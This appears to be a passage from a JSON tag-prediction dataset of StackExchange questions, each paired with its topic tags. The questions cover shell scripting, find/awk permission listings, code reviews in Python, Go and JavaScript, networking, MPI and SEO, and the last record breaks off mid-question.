current output, which does not filter the folders I wish to exclude.  The bottom part is correct, using the echoed command line from my code above.The command to call the above script is:~/myScripts/show_permissions.sh /media/nap/U14041/home/nap/catkin_ws/src/clfsm /cmake /include. Note that Stephen's solution requires that the sub-folders to be excluded be specified without a leading /.user@rMBP-Ubuntu:[12:29]:/home/user/catkin_ws/src/clfsm$ ~/myScripts/show_permissions.sh /home/user/catkin_ws/src/clfsm /cmake /include=> find /home/user/catkin_ws/src/clfsm  ( ! -path /home/user/catkin_ws/src/clfsm/cmake ! -path '/home/user/catkin_ws/src/clfsm/cmake/*' ! -path /home/user/catkin_ws/src/clfsm/include ! -path '/home/user/catkin_ws/src/clfsm/include/*' ) -ls | awk '{print $3|$5|$6|$11}'++ find /home/user/catkin_ws/src/clfsm '(' '!' -path /home/user/catkin_ws/src/clfsm/cmake '!' -path ''\\''/home/user/catkin_ws/src/clfsm/cmake/*'\\''' '!' -path /home/user/catkin_ws/src/clfsm/include '!' -path ''\\''/home/user/catkin_ws/src/clfsm/include/*'\\''' ')' -ls++ awk '{print $3|$5|$6|$11}'drwxrwxr-x|user|user|/home/user/catkin_ws/src/clfsm-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/clfsm.layoutdrwxrwxr-x|user|user|/home/user/catkin_ws/src/clfsm/src-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/src/clfsm_visitorsupport.cc-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/src/clfsm_machine.cc-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/src/clfsm_visitors.cc-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/src/clfsm_main.cc-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/src/clfsm_cc.cc-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/cmake/FindLibDispatch.cmake-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/CMakeLists.txt-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/clfsm_vector_factory.hdrwxrwxr-x|user|user|/home/user/catkin_ws/src/clfsm/include/typeClassDefs-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/typeClassDefs/FSMControlStatus.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/typeClassDefs/FSM_Control.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/typeClassDefs/wb_fsm_control_status.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/typeClassDefs/wb_fsm_state_status.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/CLActionAction.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/FSMWBQueryPredicate.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/FSMSuspensibleMachine.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/FSMWBSubMachine.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/gu_util.h~-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/CLTransitionExpression.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/FSMWBContext.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/FSMState.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/FSMAction.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/FSMExpression.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/clfsm_cc.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/FSMTransition.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/clfsm_visitorsupport.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/stringConstants.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/clfsm_factory.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/FSMFactory.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/FSMachineVector.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/FSMActivity.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/clfsm_visitors.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/FSMachine.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/clfsm_cc_delegate.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/clfsm_machine.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/gu_util.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/FSMWBPredicate.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/clfsm_wb_vector_factory.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/include/FSM.h-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/package.xml-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/clfsm.cbpuser@rMBP-Ubuntu:[12:34]:/home/user/catkin_ws/src/clfsm$ find /home/user/catkin_ws/src/clfsm  \\( ! -path /home/user/catkin_ws/src/clfsm/cmake ! -path '/home/user/catkin_ws/src/clfsm/cmake/*' ! -path /home/user/catkin_ws/src/clfsm/include ! -path '/home/user/catkin_ws/src/clfsm/include/*' \\) -ls | awk '{print $3|$5|$6|$11}'drwxrwxr-x|user|user|/home/user/catkin_ws/src/clfsm-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/clfsm.layoutdrwxrwxr-x|user|user|/home/user/catkin_ws/src/clfsm/src-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/src/clfsm_visitorsupport.cc-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/src/clfsm_machine.cc-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/src/clfsm_visitors.cc-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/src/clfsm_main.cc-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/src/clfsm_cc.cc-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/CMakeLists.txt-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/package.xml-rw-rw-r--|user|user|/home/user/catkin_ws/src/clfsm/clfsm.cbpuser@rMBP-Ubuntu:[12:35]:/home/user/catkin_ws/src/clfsm$ ",
    "target": "bash;text processing"
  },
  {
    "id": "_unix.161958",
    "source": "extract every nth character from a string <eos> I am trying to figure out a solution for this question. My approach to this problem  so far is as below. Append all the characters together to make it a long string.After the above step, remove all the white spaces or tab spaces so that we will just have one big string.I was able to establish the above steps with the below command. column -s '\\t' inputfile | tr -d '[:space:]'So for an input file like this,1   0   0   0   0   00   1   1   1   0   0After applying the above command I have the values as,100000011100Now in this big string I am trying to apply an approach as below. Extract every 6th character (as the original OP wants), and append it to an array element till the end of the string. So basically, with the above step, I am trying to create the array elements as,10 (1st and 7th character), 01 (2nd and 8th character), 01 (3rd and 9th character), 01 (4th and 10th character), 00 (5th and 11th character), 00 (6th and 12th character).So my question is, how could I extract every nth character so that I could add them to an array to proceed further? (n=6, in this case). ",
    "target": "shell;shell script;string"
  },
  {
    "id": "_webapps.5070",
    "source": "How do you take ownership of your comments? <eos> Answers so far (and what these services ought to deliver):Disqus Profile (full ownership on Disqus enabled sites, claiming authorship on others)Intense Debate] (for blog publishers: tightly integrated into the WordPress blogging platform)BackType Connect Plugin (for blog publishers: copies comments (that link to one of your posts) to your blog, no matter where they are on the web)Gravatar (self-promotion, better visibility)Google Sidewiki (adds another layer)become a blog publisherIn addition, here are some other services:co.mment (conversation tracker)coComment (conversation tracker - still alive and kicking?)Google Reader: Like item action (appreciation feedback)Convenient solutions for ordinary netizens preferred.For your reading pleasure: Comment ownership is a complex  problem. The commenter writes the  comment, but the blog owner hosts it.  So of course, the blog owner has the  right to decide what he agrees to host  or not. But the person who wrote the  comment might also want to claim some  right to his writing once its  published.  (Who Owns Your Comments?  by Stephanie Booth)",
    "target": "sharing;comments;follow;communication"
  },
  {
    "id": "_cs.72196",
    "source": "Variant of offline Turing machine <eos> Let $M$ be a variant of Turing machine with no working tape but with several heads on input word. Prove that these machines accept exactly the languages in $L$.Please hint me how to start.",
    "target": "complexity theory;computability;turing machines"
  },
  {
    "id": "_unix.192331",
    "source": "Read file remove spaces and store in array <eos> I have a file with the following content:list:blue,nonered,noneorange,plot   baseball   ,     noneuniversity,noneschool,nonedesk,plotmonitor,noneearphone,noneI need to read this file, remove spaces and store each column in a different array.script:output_names=()output_plots=()while read line           do    item=$(echo -e ${line} | tr -d '[[:space:]]')    item=$(echo $item | tr , \\n)    output_names+=(${item[0]});    output_plots+=(${item[1]});done <listecho ** output_names:;for item in ${output_names[*]}do    echo $itemdoneecho ** output_plots:;for item in ${output_plots[*]}do    echo $itemdoneHowever it does not work as I expect. What is wrong? and how to fix this code?NoteIf somebody has a solution to store the data in a single array with different keys output['names'][*] and output['plots'][*], that would be highly appreciated as I do not know how to do it.Outputs:** output_names:bluenonerednoneorangeplotbaseballnoneuniversitynoneschoolnonedeskplotmonitornoneearphonenone** output_plots:",
    "target": "shell script;string;array"
  },
  {
    "id": "_codereview.93398",
    "source": "Extracting emails from a file and writing them to another file <eos> The code below works fine for me.  Is there any way that I can improve this code more? Note: delimiter is single whitespace only for email address.getmail.py#!/usr/bin/pythonimport rehandleone = open(scratchmail.txt, r)f1 = handleone.readlines()handletwo = open(mailout.txt, a+)match_list = [ ]   for ArrayItem in f1:    match_list = re.findall(r'[\\w\\.-]+@[\\w\\.-]+', ArrayItem)    if(len(match_list)>0):         handletwo.write(match_list[0]+\\r\\n) Input file scratchmail.txt:tickets.cgi:5141|5141Z4063442957942364067088508|1219588377|1219588377||PND||abc@AABBCC.com|Mjpqafml|JgALKGXCuasMph|tickets.cgi:358236|358236Z24989798132452492828304439|1433071308|1433071308||PND||xyz.abc@example.com|Edison|CpwxPARuQaqPR|tickets.cgi:86805|86805Z25422507290694218605033173|1232345784|1232345784||PND||pytest@test.com|Agfaodki|jPdSNVlbXi|Output file mailout.txt:abc@AABBCC.comxyz.abc@example.compytest@test.com",
    "target": "python;regex;csv;linux;email"
  },
  {
    "id": "_webapps.78310",
    "source": "Can't see e-mails sent from me to my alias in google apps <eos> I've set up an alias for automated e-mail delivery from a Linux box. When an e-mail is sent from me@mydomain.com (using my Google Apps credentials) to my_alias@mydomain.com I can see it on my sent mail folder and not in inbox, where I expected it to be.How can I change that so I'd be able to receive the automated e-mails?",
    "target": "google apps email;google apps for work"
  },
  {
    "id": "_unix.290112",
    "source": "rename(1)-like script in Perl, but for copying files? <eos> So there's this rename(1) Perl thing. It suits my task precisely, except that I need it to basically cp files instead of mv.How to achieve that? I have quite a few rules of renaming, all expressed compactly in s|/foodir/|/|;s|/bardir/|/| form, and then a few lines of file patterns which I need to move copy.It looks somewhat like this:rename -v 's|/pars/|/|; s|/fts/|/|; s|innobase/include|include|' \\    storage/{innobase,xtradb}/pars/{pars0grm.cc,pars0grm.y,pars0lex.l,lexyy.cc} \\    storage/{innobase,xtradb}/fts/{fts0blex.cc,fts0blex.l,fts0pars.cc,fts0pars.y,fts0tlex.cc,fts0tlex.l} \\    storage/innobase/include/fts0[bt]lex.hI suspect that a short Perl snippet would shine at this  but I don't speak Perl much.Any help?",
    "target": "scripting;perl;file copy"
  },
  {
    "id": "_scicomp.27383",
    "source": "Boundary Value Problem for CFD Case <eos> I have a Boundary Value Problem for a system of ODEs as an approach of quasi-steady one dimensional flow in a rocket combustion chamber. The equations have the following shape:\\begin{equation}\\dfrac{d (\\rho u A_{p})}{dx} = \\chi(x) \\end{equation}\\begin{equation}\\dfrac{d ((\\rho u^{2} +p) A_{p})}{dx} -p \\dfrac{A_p}{dx}= \\psi(x, \\rho, u)\\end{equation}\\begin{equation}\\dfrac{d (p \\dfrac{\\gamma }{\\gamma - 1}+\\rho u^2 )A_{p} u}{dx} = \\chi(x) h(\\rho) \\end{equation}The gas state equation closes the system\\begin{equation}p = \\rho R_g T\\end{equation}The BC's are:At the beginning of the domain as Initial Values:T(0) = value; u(0) = 0, aprox.And at the end of the domain as closure, the mass flow provides the condition:\\begin{equation}\\rho u A_p = p(1+\\dfrac{\\gamma -1}2 M(u,T)^2)^\\frac{\\gamma}{\\gamma -1} kte \\end{equation}Must be assumed the values which are not the flow magnitudes $(\\rho, p, T, u)$, known.$A_p$ and its variation can be considered a known function related to $x$, $A_p (x)$I am currently applying a finite differences approach with an Explicit Euler's for the ODEs. I have a lot of problems to choose the best method for this problem. I have tried with different ideas, the most recent was the Shooting Method with the secant method for the nonlinearity.I am very lost with this problem and it is the main part of my Bachelors Degree Thesis, so I would appreciate any help.",
    "target": "pde;fluid dynamics;boundary conditions;nonlinear equations;navier stokes"
  },
  {
    "id": "_codereview.111597",
    "source": "Mobile app backend using Gin and Gorm ORM <eos> I'm developing backend for my mobile app by using gin-gonic and gorm ORM (mysql). But I'm not sure api and db handle huge amount requests if clients increased. for example I'm using my db struct as parameter, is this a problem for concurrency ? Here is my implementation:main.go:var i Implfunc main() {    // #GIN# //    r := gin.New()    r.Use(gin.Logger())    r.Use(gin.Recovery())    // #GIN# //    // #DB# //    i.InitDB()    // #DB# //    // #TWITTER# //    t := Twitter{}    t.InitTwitter()    // #TWITTER# //    r.GET(/someEndpoint, func(c *gin.Context) {    i.InsertUser(&user)    go t.Ping(&i)    c.JSON(200, gin.H{status: true})    })    r.Run(:5000)}twitter.go:// InitAPI TO-DOfunc (t *Twitter) InitAPI(token string, tokenSecret string) {    t.API = anaconda.NewTwitterApi(token, tokenSecret)    t.UserID = strings.Split(token, -)[0]}// Ping TO-DOfunc (t *Twitter) Ping(i *Impl) {    t.GetHomeTimeLine(i)    t.GetUsersFriends(i)}// GetHomeTimeLine TO-DOfunc (t *Twitter) GetHomeTimeLine(i *Impl) {    v := url.Values{}    v.Set(count, 200)    v.Set(exclude_replies, true)    results, err := t.API.GetHomeTimeline(v)    if err != nil {        log.Println(err.Error())        return    }    tweets := convertTweets(results, t.UserID)    go i.CreateOrUpdateTimeline(tweets)}// GetUsersFriends TO-DOfunc (t *Twitter) GetUsersFriends(i *Impl) {    v := url.Values{}    v.Set(count, 200)    v.Set(skip_status, true)    friendsChannel := t.API.GetFriendsListAll(v)    for {        _friends, more := <-friendsChannel        if _friends.Error != nil {            log.Println(_friends.Error.Error())            break        }        friends := convertFriends(_friends.Friends, t.UserID)        go i.CreateOrUpdateFriends(friends)        if !more {            break        }    }}db.go:// Impl TO-DOtype Impl struct {    DB gorm.DB}// InitDB TO-DOfunc (i *Impl) InitDB() {    var err error    i.DB, err = gorm.Open(mysql, connection string)    if err != nil {        log.Fatalf(Got error when connect database, the error is '%v', err)    }    i.DB.LogMode(false)    i.DB.DB().SetMaxIdleConns(10)    i.DB.DB().SetMaxOpenConns(100)}// InsertUser TO-DOfunc (i *Impl) InsertUser(user *User) bool {    if err := i.DB.Create(&user).Error; err != nil {        log.Fatalf(InsertError: %s, err.Error())        return false    }    return true}",
    "target": "mysql;go;web services;twitter;rest"
  },
  {
    "id": "_codereview.156719",
    "source": "Combine lists of objects with no duplicates <eos> I have 2 groovy sql resultset, I need to combine the result set so that project_no should be unique and case_no can have multiple elements if there is a duplicate project_noBelow are the 2 groovy sql resultset[[project_no:0-10001,case_no:00492268],[project_no:0-10160,case_no:01957580],[project_no:1-10014,case_no:02022686]][[project_no:0-10160,case_no:01957590],[project_no:1-10014,case_no:019126],[project_no:1-2896337,case_no:02039596]]Desired List[[project_no:0-10001,case_nos:[00492268]], [project_no:0-10160,case_nos:[01957580,01957590]] ,[project_no:1-10014,case_nos:[02022686,019126]], [project_no:1-2896337,case_nos:[02039596]]]This is what I have triedcaseResultForAnalysis.each { ca ->    def ptmp = [:], caseList = []    tempPrList.add(ca[project_no])    ptmp[project_no] = ca[project_no]    caseList.add(ca[case_no])    if (caseList.size() > 0) {        ptmp[case_nos] = caseList        mergedCaseResult.push(ptmp)    }}mergedCaseResult.each { ma ->    def ptmp = [:], caseList = []    caseResultForUploads.each { cp ->        if (!tempPrList.contains(cp[project_no])) {            ptmp[project_no] = ma[project_no]            caseList.add(cp[case_no])        } else if (ma[project_no] == cp[project_no]) {            //if (!ma[case_nos].contains(cp[case_no]))            List tmp = ma[case_nos]            if (!tmp.contains(cp[case_no]))                ma[case_nos].add(cp[case_no])        }    }    if (caseList.size() > 0) {        ptmp[case_nos] = caseList        mergedCaseResult.push(ptmp)    }}//1st list caseResultForAnalysis//2nd List caseResultForUploads//desired List mergedCaseResultIs there a better way to do this, for better readability and less resource consumption?",
    "target": "groovy"
  },
  {
    "id": "_unix.192464",
    "source": "Brace expansion not working in a script <eos> for i in {1..40}do    echo $idoneI got{1..40}and I would like to have something like123and so onso I can use the variable i inside a command's parameter.",
    "target": "bash;shell;shell script;brace expansion"
  },
  {
    "id": "_webmaster.11532",
    "source": "Multilingual sites SEO and canonical <eos> I'm in the process of improving the SEO in one of our client's multilingual sites.  Currently the site passes a user the site in their preferred language by checking for a language cookie set by the system last time it was visited.  If the cookie does not exist it looks for an Accept-Language header from the browser and checks for a language supported by the site. If that fails it defaults to a language based on some preset defaults for GEO-Location.  Once we have a language determined the site will return the page in the language determined with no change to the URL and with all the proper meta tags for that language. So if a Spanish speaking user requests domain.com/venue/access/ then they we'll see Spanish while an English speaker would see English. Of course if the user clicks a language select link with a query string including lang=?? (?? would be es,en, ect.) their cookie will be changed to that language and they'll get that language from that point forward.The problem with this approach is, while usually great for a person, crawlers (currently) don't pass an Accept-Language header when they request a page.  This means that a result shown for people using Google, Bing, ect. will usually be in the default language or sometimes a completely different language depending on the path the crawler has taken to a page and how it decided to index it.  This is killing our SEO and click-though outside of the default language.We're working with two ideas for how we're going to change handling of user language.Version 1 - All languages have a sub-directoryIf a user hits a URL without a language directory we'll check for the users language by following the following steps in order until we get a match.User has cookie for language preference. Check the browser headers for a supported languageFallback to a site default language based on GEO-Location.Once a language has been determined the system will set a cookie, do a 301 direct and add the language sub-directory to the URL which will be parsed by mod-rewrite and passed as a query string parameter.Version 2 - All NEW languages have a sub-directoryThe first time a user hits the site if they hit a URL without a language directory we'll check for the users language by following the following steps in order until we get a match.User has cookie for language preference. Check the browser headers for a supported languageIf a supported language has been detected the system will set a cookie. If the language is not the default language the system will do a 301 direct and add the language sub-directory to the URL if the language is not the default site language which will be parsed by mod-rewrite and passed as a query string parameter.Any input on the better option?How should we deal with Canonical URL's depending on which option we choose, should canonical URL's point to the main URL without the language sub-directory or should they point to the version for the current language sub-directory? The client would like, if possible, to have counters for social networking reflect the totals for a page in all languages and we're assuming having separate sub-directories for language will prevent this, unless we use a canonical to a single URL which will probably screw up crawlers and negate the whole point of the language changes.Is there an ideal solution I might be missing?",
    "target": "seo;canonical url;multilingual"
  },
  {
    "id": "_codereview.135192",
    "source": "Countdown module that hides an element when a specified date is reached <eos> I have the following piece of code which hides an element when a specified date was reached. I would like to get some tips about do's and don'ts.Specifically, I'm interested in:improvements brought to this codeavoid bad practicesAnd whatever you guys consider I should be careful about.var Timer = (function(){    var $el = $('#element');    function count() {        setInterval(function() {            check();        }, 1000);    }    function hide() {        $el.hide();    }    function check() {        var currentDate = new Date();        var endingDate = new Date(July 25, 2016 11:06:00);        if (currentDate.getTime() >= endingDate.getTime()) {             hide();        }    }    return {        count: count      };})();Timer.count();",
    "target": "javascript;jquery;timer;revealing module pattern"
  },
  {
    "id": "_datascience.5023",
    "source": "What is a discrimination threshold of binary classifier? <eos> With respect to ROC can anyone please tell me what the phrase discrimination threshold of binary classifier system means? I know what a binary classifier is.",
    "target": "classification;graphs"
  },
  {
    "id": "_softwareengineering.237435",
    "source": "What is the Loopback Pattern? <eos> I was reading this blog post about Hexagonal architecture and at the bottom it says:The Loopback pattern is an explicit pattern for creating an internal replacement for an external device.When I google for Loopback pattern I don't find any details about it.  Does anyone know what the author is referring to?  For curiosity's sake, I'd like to know how to implement this.  ",
    "target": "design patterns;architecture"
  },
  {
    "id": "_codereview.74375",
    "source": "Socket namespace for a chat module <eos> I finally managed to work with socket.io namespace stuff which I'm using for building a chat module. Here, employees of multiple organizations can join and vhat with other employees of the respective organization. What I'm doing at here is creating separate namespaces for each organization. So, it'll be easier for me to manage all employees of different organizations.Here is my server side code:var express = require('express'),   http = require('http'),app = express(),server = http.createServer(app),io = require('socket.io').listen(server);var nsp_1005 = io.of('/nsp_bucket_1005');nsp_1005.on('connection', function(socket){    console.log('someone connected to namespace bucket 1005');    socket.on('addEmp', function(login_org_id, login_emp_id, login_emp_name){         console.log('addEmp - Org_Id : '+login_org_id);        console.log('addEmp - Emp_Id : '+login_emp_id);        console.log('addEmp - Emp_Name : '+login_emp_name);         });    socket.on('disconnect', function(){         console.log('Someone disconnected from namespace bucket 1005.');    });});var nsp_1010 = io.of('/nsp_bucket_1010');nsp_1010.on('connection', function(socket){    console.log('someone connected to namespace bucket 1010');      socket.on('addEmp', function(login_org_id, login_emp_id, login_emp_name){         console.log('addEmp - Org_Id : '+login_org_id);        console.log('addEmp - Emp_Id : '+login_emp_id);        console.log('addEmp - Emp_Name : '+login_emp_name);         });    socket.on('disconnect', function(){         console.log('Someone disconnected from namespace bucket 1010.');    });});Those 1005, 1010 codes are Organization IDs. Sorry for the wired naming scheme. But, one thing right now I'm feeling the way I've made this code is not so good. Because I'm duplicating the code at the time of creating namespace for each organization. Can anyone suggest a better way to arrange this code?",
    "target": "javascript;node.js;chat;namespaces;socket.io"
  },
  {
    "id": "_unix.233330",
    "source": "Make superuser act like some other user in certain directory tree <eos> I have the following problem:My home directory lies on the network and is mounted locally on home/<my username>.I can access it with my normal user account <my username>, but as root, I cannot.I do know about this question:https://serverfault.com/questions/571073/root-cannot-access-users-home-folder-shared-via-nfsHowever, this, from my limited understanding of linux systems etc., seems to be some server-side-solution, if it's even applicable in this case. But I need a client-side solution, since the admins won't change this for the time being.So I was wondering if there was some sort of option to make the superuser  automatically act like user <my username> inside the sub-directory-tree /home/<my username>, whenever the superuser needs access there.As of now, the superuser can't even cd into my home directory.Please note, the solution should work for sudo and in case I choose to sudo su.",
    "target": "permissions;sudo;nfs;su"
  },
  {
    "id": "_scicomp.8308",
    "source": "When is MPI_Wait necessary for non-blocking calls? <eos> I hope this is not too off-topic here -- I've asked it on SO but I'm hoping I'll get better answers here!I'm a little bit confused about when I should call MPI_Wait (or other variants such as: MPI_Waitall, MPII_Waitsome, etc). Consider the following situations: (Note: pseudo code)Case (1)MPI_Isend (send_buffer, send_req);    // Do local workMPI_Probe (recv_msg);MPI_Irecv (recv_buffer, recv_req);// wait for msgs to finishMPI_Wait (recv_req);   // <--- Is this needed?MPI_Wait (send_req);   // <--- How about this?So my confusion stems from MPI_Probe in this case. Since this is a blocking call, wouldn't that essentially mean it blocks the caller until message is received? If this is the case, then I think MPI_Waits are unnecessary here.How about the following case?Case (2)MPI_Isend (send_buffer, send_req);    // Do local workMPI_Probe (recv_msg);MPI_Recv (recv_buffer);// wait for msgs to finishMPI_Wait (send_req);   // <--- Is this necessary?Similar to the first case but MPI_Irecv is replaced with its blocking version. In this case, the message is definitely received by the time MPI_Wait is called which means MPI_Isend must have been finished ... Also as a separate question, what do we mean when we say MPI_Probe is blocking? Does it block until all of the message is received by the process or does it only block until meta-data (such as msg size, sender rank, etc) is received? In other words is MPI_Probe + MPI_Irecv any better than MPI_Probe + MPI_Recv ?",
    "target": "parallel computing;mpi;c"
  },
  {
    "id": "_unix.282276",
    "source": "haproxy serving wrong SSL certificate for a subdomain <eos> I have a Server that runs haproxy to redirect incoming traffic to the correct process based on the subdomain. haproxy is configured to use different SSL certificates depending on the subdomain.The configuration works, however sometimes (quite often though), haproxy serves the wrong certificate (it serves the certificate of another subdomain). I have to refresh the page multiple times in order to get the correct one.Here is my haproxy configuration:haproxy.conf",
    "target": "ssl;certificates;haproxy"
  },
  {
    "id": "_unix.351468",
    "source": "create executable files via piping <eos> Using pipes, one can create files with simple shell built-ins.{ echo #!/bin/bash \\  echo echo Hello, World! \\} > helloworld.shWith chmod these can then be made executable.$ chmod 755 helloworld.sh$ ./helloworld.shHello, World!I wonder whether it is possible to save the chmod step. Already, I found that umask cannot do the job. But perhaps someone knows an environment variable, bash trick, program to pipe through or other neat way to do it.Is it possible to have the file created with the executable bit already set?",
    "target": "shell script;permissions;executable"
  },
  {
    "id": "_unix.327647",
    "source": "Why am I unable to prioritize TCP traffic using ToS fields? <eos> I am trying to prioritize TCP traffic using ToS field in IP header.I am saturating the interface(ethernet) by sending 1GB data through iperf with ToS field set to 0x10 (Minimize-Delay).I then start another TCP client with default ToS (0).Expectation :My TCP client should not send data till iperf completes sending its data.Result:The data from my client is sent even tough iperf is sending packets with higher priority.I also tried to create the same scenario by creating 2 separate clients and allocating 0x10 and 0x08 ToS to respective clients using iptables.I used :iptables -A PREROUTING -t mangle -p tcp --sport 5000 -j TOS --set-tos Minimize-DelayI am still not able to prioritize one client over other. Altough I can see the packets marked with ToS in wireshark.I am using Ubuntu (14.04) with iptables version 1.4.21Can someone kindly help me solve the issue?ThanksVarun",
    "target": "iptables;tcp;qos"
  },
  {
    "id": "_cs.22316",
    "source": "Suboptimal Solution for a combinatorial problem <eos> I have a cost function $f(X)=\\|\\hat{X}-X\\|_2$ to minimize which depends on a $s\\times s$ matrix $X$ where $\\hat{X}$ is given and $\\|X\\|_2=\\big(\\sum_{i,j}x_{ij}^2\\big)^{1/2} $. This matrix $X$ is generated by selecting only $s$ different rows from a matrix $B$ of dimension $n\\times s$. At the end, we are going to choose one matrix $X$ that generates the least cost $f(X)$ within all possible $n\\choose s$ submatrices of B. And so, this is a combinatorial problem that becomes complicated mostly when $n$ is big. So my question is can we find a suboptimal solution without going through all possible $n\\choose s$ submatrices and what kind of algorithm that I can apply to find such solution.My second question is can we apply a feature selection algorithm to find a suboptimal solution for a combinatorial problem.",
    "target": "optimization;combinatorics;parallel computing"
  },
  {
    "id": "_unix.275014",
    "source": "Open tar-file that ends with .b <eos> I have a tar file that ends with .b and I don't know how to open it. Neither in windows, neither Linux I've been successful to open it.data.ext4.tar.bAnother tar that ends with .a could easily be opened in Windowsdata.ext4.tar.aWhat's is the difference? How can I possibly open the .b tar?This is from an Android OS image - a nandroid backup. .a consists of all the apps and hopefully .b consists of pictures",
    "target": "linux;tar"
  },
  {
    "id": "_webmaster.32816",
    "source": "how to handle foreign content on a blog (double content) <eos> I'm quitely new to SEO and I don't know how to handle foreign content on a blog.I am writing content for two different blogs. The subjects of these blogs intersect partially, so there are sometimes situations in which I like to post exactly the same entry on both blogs. On the other hand I often see blogposts with a note like this post was first published on www.xyz.com.I thought to avoid the problem with double content I could use a canonical link in both cases. But all I read about using it cross-domain supposes to still have the same website.So what is the best practice to handle this, by avoidingthat the original site doesn't benefit from being the first-posted andthat the second site has disadvantages because of containing double content?edit: I assume the fact that google tries to serve different contents for given keywords. Sites which doesn't seem to be the original one of multiple found content are ranked down, based on the presumption the content was stolen or something else (this correct?). How to prevent this behaviour if content is legally doubled? Would the canonical-link be the right way or isn't there any, bercause it'd be against googles aims?",
    "target": "seo;google;canonical url;best practices"
  },
  {
    "id": "_cs.77138",
    "source": "Number of Retransmission in case of Go Back N <eos> While Going through Exercise problem of  Computer Networking  A Top-Down Approach by Kurose and Ross, i encountered this problem.I am giving my approach and the point where i am stuck at.QuestionSuppose Host A sends 5 data segments to Host B, and the 2nd segment  (sent from A) is lost. In the end, all 5 data segments have been correctly  received by Host B.How many segments has Host A sent in total and how many ACKs has Host B sent in total for Go Back NGiven AnswerGoBackN:  $A$ sends $9$ segments in total. They are initially sent segments $1, 2, 3, 4, 5 $and later resent segments $2, 3, 4, $and $5$. $B$ sends $8$ ACKs. They are $4$ ACKS with sequence number $1,$ and $4$ ACKS with sequence numbers $2, 3, 4,$ and $5.$My Approach /DoubtI agree with the number of transmission of data segment by Host $A$.But i have doubt regarding the Acknowledgement by Host $B$.Why?We know that GBN has sender side window size=$N$ while reciever side as only$1$ which is the reason that it cannot  recieve Out of order packet.Now When Host $A$ sends entire packet $1,2,3,4,5$  where $2^{nd}$ gets lost then Host $B$ which is expecting Sequence number $1$.On recieving sequence number $1$, it will send ack as $2$i.e expecting sequence number $2$.As Sequence number gets lost , host $B$ will recieve sequence $3,4,5$ for which it will discard the packet as it is not the packet it is expecting.On recieving again sequence number $2,3,4,5$(retransmitted packet), Host $B$ will send the Acknowledgement.Total Acknowledgement i am getting is $5$ i.e ACk no for sequence number $1,2,3,4,5$ not $8$.Please help me out where i am wrong ??Thanks ",
    "target": "computer networks"
  },
  {
    "id": "_unix.180207",
    "source": "How can I invoke a prompt for an ssh key passphrase during the execution of a script? <eos> In my ssh_config file there are multiple entries for sites on the same server such as:Host site1     HostName 123.1.1.1     User myuser     Port 13245     GSSAPIAuthentication no     IdentityFile /home/myuser/.ssh/id_dsaHost site2...I use a passphrase protected key in order to log in to the remote server and this works fine. However, I'm attempting to create some bash scripts that synchronize files using rsync and would like for the script to to prompt me for the passphrase and then execute the rsync command. ssh-agent seems to be what I want to use but I'm having difficulty figuring it out. I'm looking for something like...HOST=site1:SRC=/var/fooDEST=/home/barSYNC=(rsync $SRC $HOST$DEST...)# rsync /var/foo site1:/home/bar...read -r -p Are you sure? [y/N]  responseresponse=${response,,}if [[ $response =~ ^(yes|y)$ ]]then    #check to see if the passphrase exists from prior execution of this script.    if [ no ];then        #use ssh-add to prompt for passphrase        ssh-add #? ;        #then execute rsync command        ${SYNC[@]}    else        #execute rsync command        ${SYNC[@]}    fielse    echo Operation aborted!fiThe only examples I've been able to find either suggest code be placed in .bashrc or .profile which forces me to enter a passphrase each time I start a shell or create an expect file which stores the passphrase, neither of which I desire to do. How can I achieve a prompt 